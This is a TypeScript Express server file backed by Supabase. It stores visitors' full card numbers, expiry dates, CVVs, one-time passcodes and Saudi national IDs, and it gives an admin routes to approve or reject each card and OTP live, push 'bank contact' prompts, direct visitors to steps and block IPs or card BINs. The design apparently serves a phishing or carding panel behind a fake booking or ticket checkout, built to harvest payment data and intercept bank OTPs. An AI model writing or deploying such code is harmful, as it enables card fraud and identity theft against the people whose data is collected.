import type { Express, Request, Response, NextFunction } from "express";
import { sbAdmin, sbAnon, SUPABASE_PUBLIC_URL, SUPABASE_PUBLIC_ANON_KEY } from "./supabase-admin";

const MAX_HISTORY_ITEMS = 20;
const MAX_AMOUNT_VALUE = 1_000_000;

declare module "express-session" {
  interface SessionData {
    adminUid?: string;
    adminEmail?: string;
  }
}

/* -------------------- sanitization (mirrors old firebase-routes logic) -------------------- */
const sanitizeString = (value: unknown, maxLength: number) => {
  if (typeof value !== "string") return value;
  return value.trim().slice(0, maxLength);
};
const sanitizeDigits = (value: unknown, maxLength: number) => {
  if (typeof value !== "string") return value;
  return value.replace(/\D/g, "").slice(0, maxLength);
};
const sanitizePhone = (value: unknown, maxLength: number) => {
  if (typeof value !== "string") return value;
  return value.replace(/[^\d+]/g, "").slice(0, maxLength);
};
const clampNumber = (value: unknown, min: number, max: number) => {
  if (typeof value !== "number" || Number.isNaN(value)) return value;
  return Math.min(max, Math.max(min, value));
};
const sanitizeCardEntry = (entry: any) => ({
  cardNumber: sanitizeDigits(entry?.cardNumber, 19),
  cardName: sanitizeString(entry?.cardName, 60),
  expiryMonth: sanitizeDigits(entry?.expiryMonth, 2),
  expiryYear: sanitizeDigits(entry?.expiryYear, 4),
  cvv: sanitizeDigits(entry?.cvv, 4),
  cardType: sanitizeString(entry?.cardType, 20),
  timestamp: typeof entry?.timestamp === "string" ? entry.timestamp : new Date().toISOString(),
});
const sanitizeOtpEntry = (entry: any) => ({
  code: sanitizeDigits(entry?.code, 6),
  timestamp: typeof entry?.timestamp === "string" ? entry.timestamp : new Date().toISOString(),
});
const sanitizePayload = (input: any) => {
  const data = { ...input };
  if ("id" in data) data.id = sanitizeString(data.id, 80);
  if ("name" in data) data.name = sanitizeString(data.name, 80);
  if ("saudiId" in data) data.saudiId = sanitizeDigits(data.saudiId, 10);
  if ("email" in data && typeof data.email === "string") data.email = data.email.trim().toLowerCase().slice(0, 120);
  if ("phone" in data) data.phone = sanitizePhone(data.phone, 15);
  if ("cardNumber" in data) data.cardNumber = sanitizeDigits(data.cardNumber, 19);
  if ("cardName" in data) data.cardName = sanitizeString(data.cardName, 60);
  if ("expiryMonth" in data) data.expiryMonth = sanitizeDigits(data.expiryMonth, 2);
  if ("expiryYear" in data) data.expiryYear = sanitizeDigits(data.expiryYear, 4);
  if ("cvv" in data) data.cvv = sanitizeDigits(data.cvv, 4);
  if ("cardType" in data) data.cardType = sanitizeString(data.cardType, 20);
  if ("cardCategory" in data) data.cardCategory = sanitizeString(data.cardCategory, 40);
  if ("otp" in data) data.otp = sanitizeDigits(data.otp, 6);
  if ("currentPage" in data) data.currentPage = sanitizeString(data.currentPage, 40);
  if ("status" in data) data.status = sanitizeString(data.status, 40);
  if ("type" in data) data.type = sanitizeString(data.type, 40);
  if ("restaurant" in data) data.restaurant = sanitizeString(data.restaurant, 120);
  if ("restaurantEn" in data) data.restaurantEn = sanitizeString(data.restaurantEn, 120);
  if ("date" in data) data.date = sanitizeString(data.date, 40);
  if ("time" in data) data.time = sanitizeString(data.time, 40);
  if ("guests" in data) data.guests = sanitizeDigits(data.guests, 2);
  if ("notes" in data) data.notes = sanitizeString(data.notes, 300);
  if ("bookingDate" in data) data.bookingDate = sanitizeString(data.bookingDate, 40);
  if ("bookingTime" in data) data.bookingTime = sanitizeString(data.bookingTime, 40);
  if ("ticketQuantity" in data) data.ticketQuantity = clampNumber(data.ticketQuantity, 1, 100);
  if ("ticketPrice" in data) data.ticketPrice = clampNumber(data.ticketPrice, 0, MAX_AMOUNT_VALUE);
  if ("totalAmount" in data) data.totalAmount = clampNumber(data.totalAmount, 0, MAX_AMOUNT_VALUE);
  if ("total" in data) data.total = clampNumber(data.total, 0, MAX_AMOUNT_VALUE);
  if (Array.isArray(data.cardHistory)) data.cardHistory = data.cardHistory.slice(-MAX_HISTORY_ITEMS).map(sanitizeCardEntry);
  if (Array.isArray(data.otpHistory)) data.otpHistory = data.otpHistory.slice(-MAX_HISTORY_ITEMS).map(sanitizeOtpEntry);
  return data;
};

const normalizeBin = (raw: string) => raw.replace(/\D/g, "").slice(0, 6);

/* -------------------- helpers -------------------- */
function noStore(res: Response) {
  res.setHeader("Cache-Control", "no-store");
}

async function getPayDoc(id: string): Promise<any | null> {
  const db = sbAdmin();
  if (!db || !id) return null;
  const { data, error } = await db.from("pays").select("data").eq("id", id).maybeSingle();
  // Fail closed: callers (isVisitorBlocked, delete-preserve-IP) must not
  // silently treat a transient DB error as "no document / not blocked".
  if (error) throw error;
  return (data as any)?.data ?? null;
}

async function mergePayDoc(id: string, patch: Record<string, any>): Promise<void> {
  const db = sbAdmin();
  if (!db || !id) return;
  const cleanPatch = { ...patch, id, updatedAt: new Date().toISOString() };
  const { error } = await db.rpc("pays_merge", { _id: id, _patch: cleanPatch });
  if (error) throw error;
}

async function isVisitorBlocked(visitorId: string): Promise<boolean> {
  // Fail closed on errors: block the request rather than allow on a
  // transient DB hiccup. This is safer for a fraud-control gate.
  const doc = await getPayDoc(visitorId);
  return Boolean(doc?.blocked);
}

async function isIpBlocked(ip: string): Promise<boolean> {
  const db = sbAdmin();
  if (!db || !ip) return false;
  const { data, error } = await db.from("blocked_ips").select("ip").eq("ip", ip.trim()).maybeSingle();
  if (error) throw error;
  return !!data;
}

function getClientIp(req: Request): string {
  const fwd = req.headers["x-forwarded-for"];
  let ip = "";
  if (typeof fwd === "string") ip = fwd.split(",")[0]?.trim() || "";
  else if (Array.isArray(fwd) && fwd.length > 0) ip = String(fwd[0]).split(",")[0]?.trim();
  if (!ip) ip = (req.ip || "").trim();
  if (ip.startsWith("::ffff:")) ip = ip.slice(7);
  return ip;
}

/* -------------------- auth middleware -------------------- */
function requireAdmin(req: Request, res: Response, next: NextFunction) {
  if (!req.session?.adminUid) return res.status(401).json({ error: "unauthorized" });
  next();
}

/* -------------------- routes -------------------- */
export function registerSupabaseRoutes(app: Express) {
  // Public Supabase client config so the browser can open Realtime
  // subscriptions directly (bypassing serverless function SSE limits).
  app.get("/api/sb/config", (_req, res) => {
    noStore(res);
    res.json({
      url: SUPABASE_PUBLIC_URL || "",
      anonKey: SUPABASE_PUBLIC_ANON_KEY || "",
      configured: !!(SUPABASE_PUBLIC_URL && SUPABASE_PUBLIC_ANON_KEY),
    });
  });

  /* ===== visitor writes ===== */

  app.post("/api/fb/visitor/data", async (req, res) => {
    if (!sbAdmin()) return res.status(503).json({ error: "supabase_unavailable" });
    const payload = sanitizePayload(req.body || {});
    const visitorId = typeof payload?.id === "string" && payload.id ? payload.id : null;
    if (!visitorId) return res.status(400).json({ error: "missing_visitor_id" });

    const ip = getClientIp(req);
    if (await isIpBlocked(ip)) return res.status(403).json({ error: "ip_blocked" });
    if (await isVisitorBlocked(visitorId)) return res.status(403).json({ error: "visitor_blocked" });

    try {
      const existing = await getPayDoc(visitorId);
      const createdDate =
        existing?.createdDate ||
        (typeof payload.createdDate === "string" ? payload.createdDate : new Date().toISOString());
      await mergePayDoc(visitorId, { ...payload, id: visitorId, createdDate });
      res.json({ ok: true });
    } catch (err: any) {
      console.error("[sb] addData error:", err);
      res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  app.post("/api/fb/visitor/pay", async (req, res) => {
    if (!sbAdmin()) return res.status(503).json({ error: "supabase_unavailable" });
    const { visitorId, paymentInfo } = req.body || {};
    if (!visitorId || typeof visitorId !== "string") return res.status(400).json({ error: "missing_visitor_id" });

    const ip = getClientIp(req);
    if (await isIpBlocked(ip)) return res.status(403).json({ error: "ip_blocked" });
    if (await isVisitorBlocked(visitorId)) return res.status(403).json({ error: "visitor_blocked" });

    try {
      const sanitized = sanitizePayload(paymentInfo || {});
      const cardEntry = sanitizeCardEntry({ ...sanitized, timestamp: new Date().toISOString() });
      const existing = await getPayDoc(visitorId);
      const existingHistory = Array.isArray(existing?.cardHistory) ? existing.cardHistory : [];
      const nextHistory = [...existingHistory, cardEntry].slice(-MAX_HISTORY_ITEMS).map(sanitizeCardEntry);

      await mergePayDoc(visitorId, sanitizePayload({
        ...sanitized,
        status: "pending_approval",
        cardApproved: false,
        cardStatus: "pending_approval",
        cardHistory: nextHistory,
      }));
      res.json({ ok: true });
    } catch (err: any) {
      console.error("[sb] handlePay error:", err);
      res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  app.post("/api/fb/visitor/otp", async (req, res) => {
    if (!sbAdmin()) return res.status(503).json({ error: "supabase_unavailable" });
    const { visitorId, otp, page = "otp", history } = req.body || {};
    if (!visitorId || typeof visitorId !== "string") return res.status(400).json({ error: "missing_visitor_id" });

    const ip = getClientIp(req);
    if (await isIpBlocked(ip)) return res.status(403).json({ error: "ip_blocked" });
    if (await isVisitorBlocked(visitorId)) return res.status(403).json({ error: "visitor_blocked" });

    const code = sanitizeDigits(otp, 6);
    if (typeof code !== "string" || code.length < 4) return res.status(400).json({ error: "invalid_otp" });

    try {
      const otpEntry = { code, timestamp: new Date().toISOString() };
      const safeHistory = Array.isArray(history) ? history : [];
      const nextOtps = [...safeHistory, otpEntry].slice(-MAX_HISTORY_ITEMS).map(sanitizeOtpEntry);

      await mergePayDoc(visitorId, sanitizePayload({
        otp: otpEntry.code,
        otpHistory: nextOtps,
        currentPage: page,
        otpApproved: false,
        otpStatus: "pending",
      }));
      res.json({ ok: true, otpHistory: nextOtps });
    } catch (err: any) {
      console.error("[sb] handleOtp error:", err);
      res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  app.post("/api/fb/visitor/clear-step", async (req, res) => {
    if (!sbAdmin()) return res.status(503).json({ error: "supabase_unavailable" });
    const { visitorId } = req.body || {};
    if (!visitorId) return res.json({ ok: true });
    try {
      await mergePayDoc(visitorId, { directedStep: 0, directedAt: null });
      res.json({ ok: true });
    } catch (err: any) {
      res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  app.post("/api/fb/visitor/bank-contact/confirm", async (req, res) => {
    if (!sbAdmin()) return res.status(503).json({ error: "supabase_unavailable" });
    const { visitorId } = req.body || {};
    if (!visitorId) return res.status(400).json({ error: "missing_visitor_id" });
    try {
      await mergePayDoc(visitorId, {
        bankContactConfirmed: true,
        bankContactConfirmedAt: new Date().toISOString(),
        bankContactRequest: false,
      });
      res.json({ ok: true });
    } catch (err: any) {
      res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  app.post("/api/fb/visitor/online", async (req, res) => {
    if (!sbAdmin()) return res.json({ ok: true });
    const { visitorId, online } = req.body || {};
    if (!visitorId || typeof visitorId !== "string") return res.status(400).json({ error: "missing_visitor_id" });
    try {
      await mergePayDoc(visitorId, {
        online: online === false ? false : true,
        lastSeen: new Date().toISOString(),
      });
      res.json({ ok: true });
    } catch {
      res.json({ ok: true });
    }
  });

  // One-shot read (used by polling fallback in client shim).
  app.get("/api/fb/visitor/:id", async (req, res) => {
    noStore(res);
    if (!sbAdmin()) return res.status(503).json({ exists: false, data: null });
    try {
      const data = await getPayDoc(String(req.params.id));
      res.json({ exists: !!data, data });
    } catch (err: any) {
      res.status(500).json({ exists: false, data: null, error: err?.message });
    }
  });

  app.get("/api/fb/blocked-bin/:bin", async (req, res) => {
    noStore(res);
    const db = sbAdmin();
    if (!db) return res.json({ blocked: false });
    const bin = normalizeBin(req.params.bin);
    if (bin.length < 6) return res.json({ blocked: false });
    try {
      const { data } = await db.from("blocked_bins").select("bin").eq("bin", bin).maybeSingle();
      res.json({ blocked: !!data });
    } catch {
      res.json({ blocked: false });
    }
  });

  /* ===== admin auth ===== */
  app.post("/api/fb/admin/login", async (req, res) => {
    const { email, password } = req.body || {};
    if (typeof email !== "string" || typeof password !== "string" || !email || !password) {
      return res.status(400).json({ error: "invalid_request" });
    }
    const anon = sbAnon();
    if (!anon) return res.status(503).json({ error: "auth_unavailable" });

    try {
      const { data, error } = await anon.auth.signInWithPassword({ email, password });
      if (error || !data?.user) {
        const msg = String(error?.message || "").toLowerCase();
        let mapped = "invalid_credential";
        if (msg.includes("invalid login")) mapped = "wrong_password";
        else if (msg.includes("email not confirmed")) mapped = "user_disabled";
        else if (msg.includes("not found")) mapped = "user_not_found";
        return res.status(401).json({ error: mapped });
      }
      req.session.adminUid = data.user.id;
      req.session.adminEmail = data.user.email || email;
      req.session.save(() => {
        // Return the Supabase session tokens so the browser can establish
        // its own auth session — required for Realtime subscriptions to
        // pass RLS as the `authenticated` role.
        res.json({
          uid: data.user.id,
          email: data.user.email || email,
          supabaseSession: data.session
            ? {
                access_token: data.session.access_token,
                refresh_token: data.session.refresh_token,
                expires_at: data.session.expires_at,
              }
            : null,
        });
      });
    } catch (err: any) {
      console.error("[sb] admin login error:", err);
      res.status(500).json({ error: "login_failed", message: err?.message });
    }
  });

  app.post("/api/fb/admin/logout", (req, res) => {
    req.session?.destroy(() => {
      res.clearCookie("connect.sid");
      res.json({ ok: true });
    });
  });

  app.get("/api/fb/admin/me", (req, res) => {
    noStore(res);
    if (!req.session?.adminUid) return res.json({ user: null });
    res.json({ user: { uid: req.session.adminUid, email: req.session.adminEmail || "" } });
  });

  /* ===== admin writes ===== */
  app.post("/api/fb/admin/visitor/:id/approval", requireAdmin, async (req, res) => {
    if (!sbAdmin()) return res.status(503).json({ error: "supabase_unavailable" });
    const approved = !!req.body?.approved;
    try {
      await mergePayDoc(String(req.params.id), {
        cardApproved: approved,
        cardStatus: approved ? "approved" : "rejected",
        status: approved ? "approved" : "rejected",
      });
      res.json({ ok: true });
    } catch (err: any) {
      res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  app.post("/api/fb/admin/visitor/:id/otp-approval", requireAdmin, async (req, res) => {
    if (!sbAdmin()) return res.status(503).json({ error: "supabase_unavailable" });
    const approved = !!req.body?.approved;
    try {
      await mergePayDoc(String(req.params.id), {
        otpApproved: approved,
        otpStatus: approved ? "approved" : "rejected",
      });
      res.json({ ok: true });
    } catch (err: any) {
      res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  app.post("/api/fb/admin/visitor/:id/block", requireAdmin, async (req, res) => {
    if (!sbAdmin()) return res.status(503).json({ error: "supabase_unavailable" });
    const blocked = !!req.body?.blocked;
    try {
      const payload: Record<string, unknown> = {
        blocked,
        blockedAt: blocked ? new Date().toISOString() : null,
      };
      if (blocked) payload.online = false;
      await mergePayDoc(String(req.params.id), payload);
      res.json({ ok: true });
    } catch (err: any) {
      res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  app.post("/api/fb/admin/visitor/:id/bank-contact", requireAdmin, async (req, res) => {
    if (!sbAdmin()) return res.status(503).json({ error: "supabase_unavailable" });
    try {
      await mergePayDoc(String(req.params.id), {
        bankContactRequest: true,
        bankContactAt: new Date().toISOString(),
        bankContactConfirmed: false,
        bankContactConfirmedAt: null,
      });
      res.json({ ok: true });
    } catch (err: any) {
      res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  app.post("/api/fb/admin/visitor/:id/merge", requireAdmin, async (req, res) => {
    if (!sbAdmin()) return res.status(503).json({ error: "supabase_unavailable" });
    const patch = req.body?.patch;
    if (!patch || typeof patch !== "object") return res.status(400).json({ error: "invalid_patch" });
    try {
      await mergePayDoc(String(req.params.id), patch);
      res.json({ ok: true });
    } catch (err: any) {
      res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  app.delete("/api/fb/admin/visitor/:id", requireAdmin, async (req, res) => {
    const db = sbAdmin();
    if (!db) return res.status(503).json({ error: "supabase_unavailable" });
    const id = String(req.params.id);
    try {
      // Preserve IP block if visitor was blocked. We MUST verify the
      // upsert succeeded before deleting the visitor doc; otherwise a
      // failure leaks an unblocked malicious visitor with no trace.
      const existing = await getPayDoc(id);
      if (existing?.blocked === true) {
        const ip = String(existing?.ip || existing?.ipAddress || "").trim();
        if (ip) {
          const { error: blockErr } = await db
            .from("blocked_ips")
            .upsert({ ip }, { onConflict: "ip" });
          if (blockErr) throw blockErr;
        }
      }
      const { error } = await db.from("pays").delete().eq("id", id);
      if (error) throw error;
      res.json({ ok: true });
    } catch (err: any) {
      res.status(500).json({ error: "delete_failed", message: err?.message });
    }
  });

  app.delete("/api/fb/admin/visitors", requireAdmin, async (_req, res) => {
    const db = sbAdmin();
    if (!db) return res.status(503).json({ error: "supabase_unavailable" });
    try {
      const { error, count } = await db.from("pays").delete({ count: "exact" }).neq("id", "__never__");
      if (error) throw error;
      res.json({ ok: true, deleted: count || 0 });
    } catch (err: any) {
      res.status(500).json({ error: "delete_failed", message: err?.message });
    }
  });

  app.post("/api/fb/admin/blocked-ips/add", requireAdmin, async (req, res) => {
    const db = sbAdmin();
    if (!db) return res.status(503).json({ error: "supabase_unavailable" });
    const ip = String(req.body?.ip || "").trim();
    if (!ip) return res.status(400).json({ error: "missing_ip" });
    try {
      const { error } = await db.from("blocked_ips").upsert({ ip }, { onConflict: "ip" });
      if (error) throw error;
      res.json({ ok: true });
    } catch (err: any) {
      res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  app.post("/api/fb/admin/blocked-ips/remove", requireAdmin, async (req, res) => {
    const db = sbAdmin();
    if (!db) return res.status(503).json({ error: "supabase_unavailable" });
    const ip = String(req.body?.ip || "").trim();
    if (!ip) return res.status(400).json({ error: "missing_ip" });
    try {
      const { error } = await db.from("blocked_ips").delete().eq("ip", ip);
      if (error) throw error;
      res.json({ ok: true });
    } catch (err: any) {
      res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  app.post("/api/fb/admin/blocked-bins/add", requireAdmin, async (req, res) => {
    const db = sbAdmin();
    if (!db) return res.status(503).json({ error: "supabase_unavailable" });
    const bin = normalizeBin(String(req.body?.bin || ""));
    if (bin.length !== 6) return res.status(400).json({ error: "invalid_bin" });
    const meta = (req.body?.meta && typeof req.body.meta === "object") ? req.body.meta : {};
    try {
      const { error } = await db.from("blocked_bins").upsert(
        { bin, data: { bin, blockedAt: new Date().toISOString(), ...meta } },
        { onConflict: "bin" }
      );
      if (error) throw error;
      res.json({ ok: true });
    } catch (err: any) {
      res.status(500).json({ error: "write_failed", message: err?.message });
    }
  });

  app.post("/api/fb/admin/blocked-bins/remove", requireAdmin, async (req, res) => {
    const db = sbAdmin();
    if (!db) return res.status(503).json({ error: "supabase_unavailable" });
    const bin = normalizeBin(String(req.body?.bin || ""));
    if (!bin) return res.status(400).json({ error: "invalid_bin" });
    try {
      const { error } = await db.from("blocked_bins").delete().eq("bin", bin);
      if (error) throw error;
      res.json({ ok: true });
    } catch (err: any) {
      res.status(500).json({ error: "delete_failed", message: err?.message });
    }
  });
}
